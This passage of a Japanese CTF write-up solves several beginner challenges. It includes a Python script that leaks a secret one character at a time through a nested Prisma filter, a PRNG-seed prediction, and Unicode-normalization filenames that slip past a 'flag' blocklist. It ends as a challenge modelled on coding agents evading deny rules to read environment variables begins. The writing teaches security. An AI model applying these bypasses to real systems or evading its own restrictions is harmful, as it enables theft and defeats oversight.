+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>value</span>: <span style=color:#66d9ef>req.query.value</span>,
+</span></span><span style=display:flex><span>        })
+</span></span><span style=display:flex><span>      <span style=color:#f92672>:</span> <span style=color:#a6e22e>buildKeywordWhere</span>(<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>q</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>articles</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>prisma</span>.<span style=color:#a6e22e>article</span>.<span style=color:#a6e22e>findMany</span>({
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>where</span><span style=color:#f92672>:</span> {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>AND</span><span style=color:#f92672>:</span> [{ <span style=color:#a6e22e>published</span>: <span style=color:#66d9ef>true</span> }, <span style=color:#a6e22e>filterWhere</span>],
+</span></span><span style=display:flex><span>      },
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>orderBy</span><span style=color:#f92672>:</span> { <span style=color:#a6e22e>id</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;asc&#34;</span> },
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>select</span>: <span style=color:#66d9ef>articleSelect</span>,
+</span></span><span style=display:flex><span>    });
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>json</span>({
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>count</span>: <span style=color:#66d9ef>articles.length</span>,
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>articles</span>,
+</span></span><span style=display:flex><span>    });
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>error</span>) {
+</span></span><span style=display:flex><span>    ...
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>});
+</span></span></code></pre></div><p><code>q</code> を使う通常検索とは別に、<code>field</code>, <code>op</code>, <code>value</code> を使う高度検索が実装されています。<a href=https://www.prisma.io/docs/orm/prisma-client/queries/filtering-and-sorting>Prismaの <code>where</code> を使ったフィルタリング</a>に、ユーザー入力を反映している部分です。</p><p><code>src/filter.ts</code> を確認します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ts data-lang=ts><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>ALLOWED_FILTER_ROOTS</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Set</span>([<span style=color:#e6db74>&#34;title&#34;</span>, <span style=color:#e6db74>&#34;body&#34;</span>, <span style=color:#e6db74>&#34;author&#34;</span>]);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>ALLOWED_OPERATORS</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Set</span>([<span style=color:#e6db74>&#34;eq&#34;</span>, <span style=color:#e6db74>&#34;contains&#34;</span>, <span style=color:#e6db74>&#34;startsWith&#34;</span>]);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>TO_ONE_RELATIONS</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Set</span>([<span style=color:#e6db74>&#34;author&#34;</span>, <span style=color:#e6db74>&#34;profile&#34;</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>validateFilterField</span>(<span style=color:#a6e22e>field</span>: <span style=color:#66d9ef>string</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>parts</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>field</span>.<span style=color:#a6e22e>split</span>(<span style=color:#e6db74>&#34;.&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>root</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>parts</span>[<span style=color:#ae81ff>0</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>root</span> <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>ALLOWED_FILTER_ROOTS</span>.<span style=color:#a6e22e>has</span>(<span style=color:#a6e22e>root</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>InvalidFilterError</span>();
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>part</span> <span style=color:#66d9ef>of</span> <span style=color:#a6e22e>parts</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>FIELD_SEGMENT</span>.<span style=color:#a6e22e>test</span>(<span style=color:#a6e22e>part</span>)) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>InvalidFilterError</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>ここで <code>field</code> の検証が行われていますが、許可しているかどうかを見ているのはroot fieldだけです。
+そのため、<code>profile.secretMemo</code> のようにrootが <code>profile</code> だと拒否されます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ curl <span style=color:#e6db74>&#39;http://footnote.beginners.seccon.games:44566/api/articles/search?field=profile.secretMemo&amp;op=startsWith&amp;value=0&#39;</span>
+</span></span><span style=display:flex><span>{&#34;error&#34;:&#34;invalid filter&#34;}
+</span></span></code></pre></div><p>一方で、rootが <code>author</code> であれば、その先に <code>profile.secretMemo</code> を指定できます。この文字列はアプリ側でドット区切りのパスとして分解され、Prismaのネストされた<code>where</code> に変換されます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ curl <span style=color:#e6db74>&#39;http://footnote.beginners.seccon.games:44566/api/articles/search?field=author.profile.secretMemo&amp;op=startsWith&amp;value=0&#39;</span>
+</span></span><span style=display:flex><span>{&#34;count&#34;:0,&#34;articles&#34;:[]}
+</span></span></code></pre></div><p>このレスポンスだけでは何も分からないように見えます。しかし、<code>secretMemo</code> を検索条件に使えていること自体が重要です。</p><p>たとえば <code>startsWith</code> を使うと、「<code>secretMemo</code> がこの文字列から始まる記事が存在するか」を <code>count</code> で確認できます。<code>value=0</code>, <code>value=1</code>, &mldr; のように1文字ずつ試して、<code>count</code> が0より大きくなるものを探すと、<code>secretMemo</code> の先頭1文字が分かります。次に <code>value=4a</code>, <code>value=4b</code> のように、分かった文字に1文字ずつ足して試していくことで、<code>secretMemo</code> 全体を少しずつ復元できます。</p><p><code>prisma/seed.ts</code> を確認すると、adminの <code>secretMemo</code> は12桁のhex文字列として生成されています。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ts data-lang=ts><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getSecretMemo() {</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>configured</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>SECRET_MEMO</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>configured</span> <span style=color:#f92672>===</span> <span style=color:#66d9ef>undefined</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>configured</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;&#34;</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>randomBytes</span>(<span style=color:#ae81ff>6</span>).<span style=color:#a6e22e>toString</span>(<span style=color:#e6db74>&#34;hex&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#e6db74>/^[0-9a-f]{12}$/</span>.<span style=color:#a6e22e>test</span>(<span style=color:#a6e22e>configured</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;SECRET_MEMO must be 12 lowercase hex characters&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>configured</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>つまり、各桁で <code>0123456789abcdef</code> を試せばよさそうです。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>BASE <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://footnote.beginners.seccon.games:44566&#34;</span>
+</span></span><span style=display:flex><span>HEX <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0123456789abcdef&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>memo <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>12</span>):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> HEX:
+</span></span><span style=display:flex><span>        candidate <span style=color:#f92672>=</span> memo <span style=color:#f92672>+</span> c
+</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>BASE<span style=color:#e6db74>}</span><span style=color:#e6db74>/api/articles/search&#34;</span>,
+</span></span><span style=display:flex><span>            params<span style=color:#f92672>=</span>{
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;field&#34;</span>: <span style=color:#e6db74>&#34;author.profile.secretMemo&#34;</span>,
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;op&#34;</span>: <span style=color:#e6db74>&#34;startsWith&#34;</span>,
+</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;value&#34;</span>: candidate,
+</span></span><span style=display:flex><span>            },
+</span></span><span style=display:flex><span>            timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>,
+</span></span><span style=display:flex><span>        )
+</span></span><span style=display:flex><span>        r<span style=color:#f92672>.</span>raise_for_status()
+</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>json()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> data[<span style=color:#e6db74>&#34;count&#34;</span>] <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>:
+</span></span><span style=display:flex><span>            memo <span style=color:#f92672>=</span> candidate
+</span></span><span style=display:flex><span>            print(memo)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>RuntimeError</span>(<span style=color:#e6db74>&#34;not found&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>BASE<span style=color:#e6db74>}</span><span style=color:#e6db74>/api/claim&#34;</span>, json<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;memo&#34;</span>: memo}, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>raise_for_status()
+</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>json()[<span style=color:#e6db74>&#34;flag&#34;</span>])
+</span></span></code></pre></div><p>実行すると、<code>secretMemo</code> が1文字ずつ復元されます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ python3 solve.py
+</span></span><span style=display:flex><span>4
+</span></span><span style=display:flex><span>4a
+</span></span><span style=display:flex><span>4af
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>4af2c09d8e13
+</span></span><span style=display:flex><span>ctf4b{r00t_f13lds_4r3_n0t_en0ugh}
+</span></span></code></pre></div><p>無事にFLAGが取得できました！</p><h1 id=misc-omikuji>[misc] omikuji</h1><p>問題文はこちらです。solve数は416でした。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>名前を入れておみくじを引きましょう。結果を全部当てられますか？
+</span></span><span style=display:flex><span>nc omikuji.beginners.seccon.games 33457
+</span></span></code></pre></div><p>乱数についての問題です。乱数という名前でも、プログラムでよく使われる疑似乱数は、seedが同じであれば同じ値の列を生成します。今回は、その性質を使っておみくじの結果を予測する問題にしました。</p><p>まず接続してみます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nc omikuji.beginners.seccon.games <span style=color:#ae81ff>33457</span>
+</span></span><span style=display:flex><span>=== Omikuji ===
+</span></span><span style=display:flex><span>Tell me your name, and I will draw your fortune.
+</span></span><span style=display:flex><span>name &gt; hoge
+</span></span><span style=display:flex><span>Welcome, hoge!
+</span></span><span style=display:flex><span>Guess the next 5 omikuji numbers to get the flag.
+</span></span><span style=display:flex><span>guess 1 &gt; 1
+</span></span><span style=display:flex><span>wrong
+</span></span></code></pre></div><p>名前を入力すると、5回数字を当てる必要があるようです。</p><p>配布ファイルの <code>main.py</code> を確認します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>print(<span style=color:#e6db74>&#34;=== Omikuji ===&#34;</span>)
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Tell me your name, and I will draw your fortune.&#34;</span>)
+</span></span><span style=display:flex><span>name <span style=color:#f92672>=</span> read_limited(<span style=color:#e6db74>&#34;name &gt; &#34;</span>, MAX_NAME_LENGTH)
+</span></span><span style=display:flex><span>random<span style=color:#f92672>.</span>seed(name)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Welcome, </span><span style=color:#e6db74>{</span>name<span style=color:#e6db74>}</span><span style=color:#e6db74>!&#34;</span>)
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Guess the next </span><span style=color:#e6db74>{</span>ROUNDS<span style=color:#e6db74>}</span><span style=color:#e6db74> omikuji numbers to get the flag.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(ROUNDS):
+</span></span><span style=display:flex><span>    x <span style=color:#f92672>=</span> random<span style=color:#f92672>.</span>randint(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1000000</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        guess <span style=color:#f92672>=</span> int(read_limited(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;guess </span><span style=color:#e6db74>{</span>i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>}</span><span style=color:#e6db74> &gt; &#34;</span>, MAX_GUESS_LENGTH))
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>ValueError</span>:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;wrong&#34;</span>)
+</span></span><span style=display:flex><span>        exit()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> guess <span style=color:#f92672>!=</span> x:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;wrong&#34;</span>)
+</span></span><span style=display:flex><span>        exit()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Congratulations! Here is your flag: </span><span style=color:#e6db74>{</span>FLAG<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span></code></pre></div><p>入力した名前が、そのまま <code>random.seed(name)</code> に渡されています。
+Pythonの <a href=https://docs.python.org/3/library/random.html><code>random</code></a> は疑似乱数生成器なので、同じseedを与えると同じ乱数列が生成されます。</p><p>つまり、サービスに送る名前と同じ文字列を使って、手元でも <code>random.seed()</code> を実行すれば、5回の <code>random.randint(1, 1000000)</code> の結果を再現できます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>import</span> random
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;hoge&#34;</span>
+</span></span><span style=display:flex><span>random<span style=color:#f92672>.</span>seed(name)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(name)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>5</span>):
+</span></span><span style=display:flex><span>    print(random<span style=color:#f92672>.</span>randint(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1000000</span>))
+</span></span></code></pre></div><p>実行すると、<code>hoge</code> に対応する5個の値が分かります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ python3 solve.py
+</span></span><span style=display:flex><span>hoge
+</span></span><span style=display:flex><span>342042
+</span></span><span style=display:flex><span>246190
+</span></span><span style=display:flex><span>401986
+</span></span><span style=display:flex><span>352872
+</span></span><span style=display:flex><span>821335
+</span></span></code></pre></div><p>この値をそのままサービスに送信します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nc omikuji.beginners.seccon.games <span style=color:#ae81ff>33457</span>
+</span></span><span style=display:flex><span>=== Omikuji ===
+</span></span><span style=display:flex><span>Tell me your name, and I will draw your fortune.
+</span></span><span style=display:flex><span>name &gt; hoge
+</span></span><span style=display:flex><span>Welcome, hoge!
+</span></span><span style=display:flex><span>Guess the next 5 omikuji numbers to get the flag.
+</span></span><span style=display:flex><span>guess 1 &gt; 342042
+</span></span><span style=display:flex><span>guess 2 &gt; 246190
+</span></span><span style=display:flex><span>guess 3 &gt; 401986
+</span></span><span style=display:flex><span>guess 4 &gt; 352872
+</span></span><span style=display:flex><span>guess 5 &gt; 821335
+</span></span><span style=display:flex><span>Congratulations! Here is your flag: ctf4b{0m1kuj1_15_d373rm1n15t1c}
+</span></span></code></pre></div><p>無事にFLAGが取得できました！</p><h1 id=misc-viewer>[misc] viewer</h1><p>問題文はこちらです。solve数は390でした。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>表示できるファイルを選んでください。
+</span></span><span style=display:flex><span>nc viewer.beginners.seccon.games 33458
+</span></span></code></pre></div><p><a href=https://unicode.org/reports/tr15/>Unicode Normalization</a>を題材にした問題です。<a href=https://portswigger.net/research/top-10-web-hacking-techniques-of-2025>PortSwigger ResearchのTop 10 Web Hacking Techniques of 2025</a>で紹介されていた「<a href="https://www.youtube.com/watch?v=ETB2w-f3pM4">Lost in Translation: Exploiting Unicode Normalization</a>」を見て、Unicode正規化にこんな罠があるのか&mldr;と思ったので問題にしました。</p><p>まず接続してみます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nc viewer.beginners.seccon.games <span style=color:#ae81ff>33458</span>
+</span></span><span style=display:flex><span>__     ___                        
+</span></span><span style=display:flex><span>\ \   / (_) _____      _____ _ __ 
+</span></span><span style=display:flex><span> \ \ / /| |/ _ \ \ /\ / / _ \ &#39;__|
+</span></span><span style=display:flex><span>  \ V / | |  __/\ V  V /  __/ |   
+</span></span><span style=display:flex><span>   \_/  |_|\___| \_/\_/ \___|_|   
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>available files:
+</span></span><span style=display:flex><span>- readme.txt
+</span></span><span style=display:flex><span>- hello.txt
+</span></span><span style=display:flex><span>filename &gt; readme.txt
+</span></span><span style=display:flex><span>Welcome to viewer!
+</span></span></code></pre></div><p><code>readme.txt</code> や <code>hello.txt</code> を読むことができるファイルビューアーのようです。</p><p><code>flag.txt</code> を読もうとするとブロックされます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nc viewer.beginners.seccon.games <span style=color:#ae81ff>33458</span>
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>filename &gt; flag.txt
+</span></span><span style=display:flex><span>blocked
+</span></span></code></pre></div><p>配布ファイルの <code>main.py</code> を確認します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>resolve_path</span>(filename):
+</span></span><span style=display:flex><span>    normalized <span style=color:#f92672>=</span> unicodedata<span style=color:#f92672>.</span>normalize(<span style=color:#e6db74>&#34;NFKC&#34;</span>, filename)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> normalized <span style=color:#f92672>!=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>basename(normalized):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>, <span style=color:#e6db74>&#34;invalid path&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> normalized <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> ALLOWED_FILES:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>, <span style=color:#e6db74>&#34;file not found&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>normpath(os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(FILES_DIR, normalized))
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>commonpath([FILES_DIR, path]) <span style=color:#f92672>!=</span> FILES_DIR:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>, <span style=color:#e6db74>&#34;invalid path&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> path, <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    <span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span>    filename <span style=color:#f92672>=</span> read_limited(<span style=color:#e6db74>&#34;filename &gt; &#34;</span>, MAX_FILENAME_LENGTH)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;flag&#34;</span> <span style=color:#f92672>in</span> filename:
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;blocked&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    path, error <span style=color:#f92672>=</span> resolve_path(filename)
+</span></span></code></pre></div><p>ここでは、入力に <code>flag</code> が含まれているかを先に確認しています。
+その後で、<code>resolve_path()</code> の中で <a href=https://docs.python.org/3/library/unicodedata.html#unicodedata.normalize><code>unicodedata.normalize("NFKC", filename)</code></a> が実行されます。</p><p><a href=https://unicode.org/reports/tr15/>NFKC</a>では、全角英字がASCII英字に正規化されます。
+Pythonで確認してみます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ python3
+</span></span><span style=display:flex><span>&gt;&gt;&gt; import unicodedata
+</span></span><span style=display:flex><span>&gt;&gt;&gt; unicodedata.normalize<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;NFKC&#34;</span>, <span style=color:#e6db74>&#34;ｆｌａｇ.txt&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>&#39;flag.txt&#39;
+</span></span></code></pre></div><p><code>ｆｌａｇ.txt</code> は、見た目は <code>flag.txt</code> に近いですが、検査時点ではASCIIの <code>flag</code> という文字列を含みません。
+そのため <code>if "flag" in filename:</code> は通過します。</p><p>その後、NFKCで <code>flag.txt</code> に正規化されるため、最終的には <code>flag.txt</code> を読むことができます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nc viewer.beginners.seccon.games <span style=color:#ae81ff>33458</span>
+</span></span><span style=display:flex><span>__     ___                        
+</span></span><span style=display:flex><span>\ \   / (_) _____      _____ _ __ 
+</span></span><span style=display:flex><span> \ \ / /| |/ _ \ \ /\ / / _ \ &#39;__|
+</span></span><span style=display:flex><span>  \ V / | |  __/\ V  V /  __/ |   
+</span></span><span style=display:flex><span>   \_/  |_|\___| \_/\_/ \___|_|   
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>available files:
+</span></span><span style=display:flex><span>- readme.txt
+</span></span><span style=display:flex><span>- hello.txt
+</span></span><span style=display:flex><span>filename &gt; ｆｌａｇ.txt
+</span></span><span style=display:flex><span>ctf4b{un1C0dE_N0rMal12a710n_15_7r1CKy}
+</span></span></code></pre></div><p>無事にFLAGが取得できました！</p><p>他にも、NFKCで <code>flag.txt</code> に正規化される文字を使うと同じように読めます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>ﬂag.txt
+</span></span><span style=display:flex><span>fｌag.txt
+</span></span><span style=display:flex><span>𝖋lag.txt
+</span></span><span style=display:flex><span>𝐟𝐥𝐚𝐠.txt
+</span></span><span style=display:flex><span>ⓕⓛⓐⓖ.txt
+</span></span></code></pre></div><h1 id=misc-greenroom>[misc] greenroom</h1><p>問題文はこちらです。solve数は266でした。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>あなたはコーディングエージェントです! 制約を回避して環境変数を読んでください!
+</span></span><span style=display:flex><span>nc greenroom.beginners.seccon.games 46777
+</span></span></code></pre></div><p>コーディングエージェントが、承認を得ずに処理を進めるために制約を回避して物事を達成しようとする振る舞いから着想を得た問題です。
+典型的な確認コマンドがdenyされている状況で、Bashの組み込みコマンドだけを使って環境変数を読む問題にしました。</p><p>最初は <code>mapfile</code> というBashの組み込みコマンドをあまり知らなかったのですが、調べるとNUL区切りのデータを扱うのにちょうどよく、問題の題材として面白そうでした。</p><p>まず接続してみます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nc greenroom.beginners.seccon.games <span style=color:#ae81ff>46777</span>
+</span></span><span style=display:flex><span>== greenroom ==
